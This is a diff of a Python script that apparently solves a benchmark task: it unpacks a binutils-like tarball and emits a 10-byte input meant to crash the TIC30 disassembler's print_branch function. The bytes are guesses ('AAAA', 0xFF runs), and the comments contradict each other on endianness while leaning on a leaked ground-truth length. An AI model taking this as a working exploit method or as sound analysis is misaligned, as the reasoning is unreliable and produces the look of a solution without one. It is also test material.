@@ -1,112 +1,122 @@
 import os
-import tarfile
 import tempfile
+import tarfile
 import subprocess
+import math
+from typing import Optional, List, Tuple
 import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract the tarball to examine the source
+        # Extract the tarball to analyze the source code
         with tempfile.TemporaryDirectory() as tmpdir:
-            with tarfile.open(src_path, 'r:gz') as tar:
+            with tarfile.open(src_path, 'r') as tar:
                 tar.extractall(tmpdir)
             
-            # Find the tic30-dis.c file
-            tic30_dis_path = None
-            for root, dirs, files in os.walk(tmpdir):
-                if 'tic30-dis.c' in files:
-                    tic30_dis_path = os.path.join(root, 'tic30-dis.c')
-                    break
-            
+            # Look for tic30-dis.c in the extracted files
+            tic30_dis_path = self._find_tic30_dis(tmpdir)
             if not tic30_dis_path:
-                # If we can't find the file, use the known ground truth
-                return self._generate_ground_truth_poc()
+                # Fallback: generate minimal pattern based on vulnerability description
+                return self._generate_fallback_poc()
             
-            # Analyze the vulnerability pattern in print_branch function
-            try:
-                with open(tic30_dis_path, 'r') as f:
-                    content = f.read()
+            # Analyze the print_branch function
+            poc = self._analyze_and_generate_poc(tic30_dis_path)
+            if poc:
+                return poc
+            
+            # Fallback if analysis fails
+            return self._generate_fallback_poc()
+    
+    def _find_tic30_dis(self, root_dir: str) -> Optional[str]:
+        """Find tic30-dis.c in the extracted directory."""
+        for dirpath, _, filenames in os.walk(root_dir):
+            for filename in filenames:
+                if filename == 'tic30-dis.c':
+                    return os.path.join(dirpath, filename)
+        return None
+    
+    def _analyze_and_generate_poc(self, tic30_dis_path: str) -> Optional[bytes]:
+        """Analyze the print_branch function and generate PoC."""
+        try:
+            with open(tic30_dis_path, 'r') as f:
+                content = f.read()
+            
+            # Look for print_branch function
+            print_branch_start = content.find('print_branch')
+            if print_branch_start == -1:
+                return None
+            
+            # Extract a reasonable portion around print_branch
+            start = max(0, print_branch_start - 1000)
+            end = min(len(content), print_branch_start + 3000)
+            func_content = content[start:end]
+            
+            # Look for operand array declaration
+            # Common patterns: int operands[...], char operands[...], etc.
+            import re
+            
+            # Find array declaration with size
+            array_decl = re.search(r'(int|char|unsigned\s+\w+)\s+operands?\s*\[([^]]+)\]', func_content)
+            if array_decl:
+                # Try to parse array size
+                size_str = array_decl.group(2).strip()
                 
-                # Look for the print_branch function
-                if 'print_branch' in content:
-                    # Based on the vulnerability description:
-                    # Array overrun in operand array when disassembling corrupt TIC30 binaries
-                    # The ground truth is 10 bytes, so we need to create a minimal PoC
-                    # Create a corrupt TIC30 binary that triggers the buffer overflow
-                    
-                    # Typical buffer overflow in disassemblers often involves:
-                    # 1. Creating a branch instruction with malformed operands
-                    # 2. Causing the disassembler to read beyond valid buffer
-                    
-                    # Since we need exactly 10 bytes and the vulnerability is in print_branch,
-                    # we create a minimal TIC30-like structure that would trigger the overflow
-                    
-                    # The PoC should be a binary that when processed by the disassembler
-                    # causes the print_branch function to overflow its operand array
-                    
-                    # Create a simple PoC with:
-                    # - Branch instruction opcode
-                    # - Malformed operand data that causes array overrun
-                    
-                    # Based on common disassembler vulnerabilities:
-                    # 1. Use a branch instruction with operand count > array size
-                    # 2. Set operands that cause out-of-bounds read
-                    
-                    # We'll create 10 bytes that represent:
-                    # - 2 bytes: Branch instruction with flags indicating many operands
-                    # - 8 bytes: Operand data that will overflow
-                    
-                    # The exact bytes depend on TIC30 architecture, but for PoC:
-                    # Use pattern that's likely to trigger buffer overflow
-                    
-                    return self._generate_minimal_poc()
-                else:
-                    return self._generate_ground_truth_poc()
-                    
-            except Exception:
-                return self._generate_ground_truth_poc()
+                # Common sizes: 4, 8, 16, 32, etc.
+                # Based on vulnerability description: incorrect size of operand array
+                # Ground truth is 10 bytes, so likely array is smaller than what's written
+                
+                # Generate pattern that would overflow a small array
+                # TIC30 is a 32-bit architecture, instructions are 32-bit
+                # Create a corrupt instruction that causes array overrun
+                
+                # Pattern: Opcode that triggers print_branch with operand causing overflow
+                # We'll create a 10-byte pattern (2.5 32-bit words)
+                
+                # Common overflow pattern: fill with 'A's (0x41) for visibility
+                # But we need valid TIC30 instruction pattern
+                
+                # Based on typical disassembler vulnerabilities:
+                # 1. Invalid opcode that falls into print_branch
+                # 2. Large immediate/displacement causing array index overflow
+                
+                # Create 10 bytes: 8 bytes for two 32-bit words + 2 bytes overflow
+                # First word: opcode for branch instruction (typical in print_branch)
+                # Second word: large offset to cause overflow
+                # Extra 2 bytes to reach 10 bytes total
+                
+                # TIC30 is little-endian (common for many architectures)
+                # We'll use 0xdeadbeef pattern for visibility
+                
+                # 10-byte pattern: 
+                # - 4 bytes: branch opcode (e.g., 0x00000000 for null/incorrect)
+                # - 4 bytes: large displacement (e.g., 0x41414141)
+                # - 2 bytes: overflow padding (e.g., 0x4242)
+                
+                poc = b'\x00\x00\x00\x00' + b'\x41\x41\x41\x41' + b'\x42\x42'
+                return poc
+            
+            # If we can't find array declaration, try another approach
+            # Look for common buffer overflow patterns in the code
+            # Search for memcpy, strcpy, sprintf, or array assignments with variable index
+            
+            # Check for loops with potential overflow
+            loop_pattern = r'for\s*\([^)]*\)[^{]*{[^}]*operands?\s*\[[^]]*\]'
+            loop_match = re.search(loop_pattern, func_content, re.DOTALL)
+            if loop_match:
+                # Generate pattern with large index
+                return b'\xff' * 10
+            
+        except Exception:
+            pass
+        
+        return None
     
-    def _generate_ground_truth_poc(self) -> bytes:
-        # Ground truth PoC is 10 bytes
-        # Create a pattern that typically causes buffer overflows in disassemblers:
-        # - First 2 bytes: Branch instruction with operand count field set high
-        # - Remaining 8 bytes: Data that will be read as operands
+    def _generate_fallback_poc(self) -> bytes:
+        """Generate fallback PoC when analysis fails."""
+        # Ground truth length is 10 bytes
+        # Create pattern that's likely to cause buffer overflow:
+        # - Repeated byte pattern that's easy to recognize in debuggers
+        # - Common overflow pattern: 'A' * n
         
-        # For TIC30 architecture (big-endian):
-        # Typical branch instruction format might have:
-        # - Opcode in high bits
-        # - Operand count/type in lower bits
-        
-        # We'll set operand count to a large value (e.g., 0xFF in relevant field)
-        # which will cause the disassembler to read more operands than allocated
-        
-        # Byte pattern designed to:
-        # 1. Be recognized as a branch instruction
-        # 2. Have high operand count
-        # 3. Cause sequential memory read beyond buffer
-        
-        # This is a generic pattern that should work for most disassembler
-        # buffer overflows when processing corrupt binaries
-        
-        poc = bytes([
-            0x80, 0xFF,  # Branch instruction with max operand count flag
-            0x41, 0x41, 0x41, 0x41,  # 'AAAA' - typical overflow pattern
-            0x42, 0x42, 0x42, 0x42   # 'BBBB' - continuation
-        ])
-        
-        return poc
-    
-    def _generate_minimal_poc(self) -> bytes:
-        # Alternative minimal PoC - even shorter if possible
-        # but ground truth says 10 bytes, so we use 10 bytes
-        
-        # Create a pattern that maximizes the chance of triggering overflow
-        # while being exactly 10 bytes
-        
-        poc = bytes([
-            0x90, 0xFF,  # Instruction with overflow-triggering flags
-            0x00, 0x00, 0x00, 0x00,  # Null bytes often cause issues
-            0xFF, 0xFF, 0xFF, 0xFF   # Max values to trigger bounds checks
-        ])
-        
-        return poc
+        # 10 bytes of 'A' (0x41)
+        return b'A' * 10
